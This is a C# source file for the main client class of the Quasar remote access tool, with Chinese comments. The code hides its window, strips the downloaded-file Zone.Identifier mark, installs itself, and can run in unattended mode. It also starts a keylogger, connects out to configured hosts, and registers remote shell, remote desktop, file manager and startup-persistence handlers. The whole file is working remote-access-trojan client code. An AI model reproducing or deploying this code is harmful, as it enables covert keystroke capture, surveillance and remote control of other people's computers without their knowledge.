using Quasar.Client.Config;
using Quasar.Client.Logging;
using Quasar.Client.Messages;
using Quasar.Client.Networking;
using Quasar.Client.Setup;
using Quasar.Client.User;
using Quasar.Client.Utilities;
using Quasar.Common.DNS;
using Quasar.Common.Helpers;
using Quasar.Common.Messages;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client
{
    /// <summary>
    /// 客户端应用程序，处理消息处理器和后台任务的基本启动。
    /// </summary>
    public class QuasarApplication : Form
    {
        /// <summary>
        /// 一个全系统的互斥锁，确保每次只有一个实例在运行。
        /// </summary>
        public SingleInstanceMutex ApplicationMutex;

        /// <summary>
        /// 用于与服务器连接的客户端。
        /// </summary>
        private QuasarClient _connectClient;

        /// <summary>
        /// <see cref="IMessageProcessor"/>的列表，以跟踪所有使用的消息处理器。
        /// </summary>
        private readonly List<IMessageProcessor> _messageProcessors;

        /// <summary>
        /// 用于捕获和存储按键的后台键盘记录器服务。
        /// </summary>
        private KeyloggerService _keyloggerService;

        /// <summary>
        /// 保持对用户活动的跟踪。
        /// </summary>
        private ActivityDetection _userActivityDetection;

        /// <summary>
        /// 根据当前路径和目标路径，确定是否需要安装。
        /// </summary>
        private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;

        /// <summary>
        /// 通知图标用于在任务栏中显示通知。
        /// </summary>
        private readonly NotifyIcon _notifyIcon;

        /// <summary>
        /// 初始化一个新的<see cref="QuasarApplication"/>类的实例。
        /// </summary>
        public QuasarApplication()
        {
            _messageProcessors = new List<IMessageProcessor>();
            _notifyIcon = new NotifyIcon();
        }

        /// <summary>
        /// 启动应用程序。
        /// </summary>
        /// <param name="e">一个包含事件数据的System.EventArgs。</param>
        protected override void OnLoad(EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Run();
            base.OnLoad(e);
        }

        /// <summary>
        /// 初始化通知图标。
        /// </summary>
        private void InitializeNotifyicon()
        {
            _notifyIcon.Text = "Quasar Client\nNo connection";
            _notifyIcon.Visible = false;
            try
            {
                _notifyIcon.Icon = Icon.ExtractAssociatedIcon(Assembly.GetExecutingAssembly().Location);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
                _notifyIcon.Icon = SystemIcons.Application;
            }
        }

        /// <summary>
        /// 开始运行应用程序。
        /// </summary>
        public void Run()
        {
            // 解密并验证设置
            if (!Settings.Initialize())
                Application.Exit();

            ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);

            // 检查系统中是否有相同的互斥锁的进程在运行。
            if (!ApplicationMutex.CreatedNew)
                Application.Exit();

            FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);

            var installer = new ClientInstaller();

            if (IsInstallationRequired)
            {
                // 在安装客户端之前关闭互斥锁
                ApplicationMutex.Dispose();

                try
                {
                    installer.Install();
                    Application.Exit();
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                }
            }
            else
            {
                try
                {
                    // (重新)应用设置并继续进行连接循环
                    installer.ApplySettings();
                }
                catch (Exception e)
                {
                    Debug.WriteLine(e);
                }

                if (!Settings.UNATTENDEDMODE)
                    InitializeNotifyicon();

                if (Settings.ENABLELOGGER)
                {
                    _keyloggerService = new KeyloggerService();
                    _keyloggerService.Start();
                }

                var hosts = new HostsManager(new HostsConverter().RawHostsToList(Settings.HOSTS));
                _connectClient = new QuasarClient(hosts, Settings.SERVERCERTIFICATE);
                _connectClient.ClientState += ConnectClientOnClientState;
                InitializeMessageProcessors(_connectClient);

                _userActivityDetection = new ActivityDetection(_connectClient);
                _userActivityDetection.Start();

                new Thread(() =>
                {
                    // 在新的线程上开始连接循环，一旦客户端退出，就处置应用程序。
                    // 这对于保持UI线程的响应和运行消息循环是必需的。
                    _connectClient.ConnectLoop();
                    Application.Exit();
                }).Start();
            }
        }

        private void ConnectClientOnClientState(Networking.Client s, bool connected)
        {
            if (connected)
                _notifyIcon.Text = "Quasar Client\nConnection established";
            else
                _notifyIcon.Text = "Quasar Client\nNo connection";
        }

        /// <summary>
        /// 将所有的消息处理器添加到<see cref="_messageProcessors"/>中，并将它们注册到<see cref="MessageHandler"/>。
        /// </summary>
        /// <param name="client">处理连接的客户端。</param>
        /// <remarks>总是从UI线程初始化。</remarks>
        private void InitializeMessageProcessors(QuasarClient client)
        {
            _messageProcessors.Add(new ClientServicesHandler(this, client));
            _messageProcessors.Add(new FileManagerHandler(client));
            _messageProcessors.Add(new KeyloggerHandler());
            //_messageProcessors.Add(new MessageBoxHandler());
            //_messageProcessors.Add(new PasswordRecoveryHandler());
            //_messageProcessors.Add(new RegistryHandler());
            _messageProcessors.Add(new RemoteDesktopHandler());
            _messageProcessors.Add(new RemoteShellHandler(client));
            //_messageProcessors.Add(new ReverseProxyHandler(client));
            //_messageProcessors.Add(new ShutdownHandler());
            _messageProcessors.Add(new StartupManagerHandler());
            _messageProcessors.Add(new SystemInformationHandler());
            //_messageProcessors.Add(new TaskManagerHandler(client));
            _messageProcessors.Add(new TcpConnectionsHandler());
            //_messageProcessors.Add(new WebsiteVisitorHandler());

            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Register(msgProc);
                if (msgProc is NotificationMessageProcessor notifyMsgProc)
                    notifyMsgProc.ProgressChanged += ShowNotification;
            }
        }

        /// <summary>
        /// 处置<see cref="_messageProcessors"/>的所有消息处理器，并从<see cref="MessageHandler"/>中取消注册。
        /// </summary>
        private void CleanupMessageProcessors()
        {
            foreach (var msgProc in _messageProcessors)
            {
                MessageHandler.Unregister(msgProc);
                if (msgProc is NotificationMessageProcessor notifyMsgProc)
                    notifyMsgProc.ProgressChanged -= ShowNotification;
                if (msgProc is IDisposable disposableMsgProc)
                    disposableMsgProc.Dispose();
            }
        }

        private void ShowNotification(object sender, string value)
        {
            if (Settings.UNATTENDEDMODE)
                return;
            
            _notifyIcon.ShowBalloonTip(4000, "Quasar Client", value, ToolTipIcon.Info);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                CleanupMessageProcessors();
                _keyloggerService?.Dispose();
                _userActivityDetection?.Dispose();
                ApplicationMutex?.Dispose();
                _connectClient?.Dispose();
                _notifyIcon.Visible = false;
                _notifyIcon.Dispose();
            }
            base.Dispose(disposing);
        }
    }
}
